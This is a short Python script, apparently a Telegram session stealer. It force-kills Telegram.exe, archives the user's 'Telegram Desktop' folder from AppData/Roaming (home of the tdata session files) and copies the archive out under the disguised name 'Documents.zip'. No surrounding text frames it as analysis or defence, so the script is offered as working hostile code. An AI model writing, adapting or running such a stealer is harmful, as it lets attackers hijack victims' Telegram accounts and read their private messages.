import os
import shutil

user =  os.getlogin()
drive = os.getenv("SystemDrive")
drive1 = os.getcwd()
path = drive + "//Users/" + user + "/AppData/Roaming"


os.chdir(path)
os.system('TASKKILL /F /IM Telegram.exe')

root_directory='Telegram Desktop'
shutil.make_archive("tdata","zip",root_directory)
shutil.copy(src="tdata.zip", dst=drive1+"\Documents.zip")  
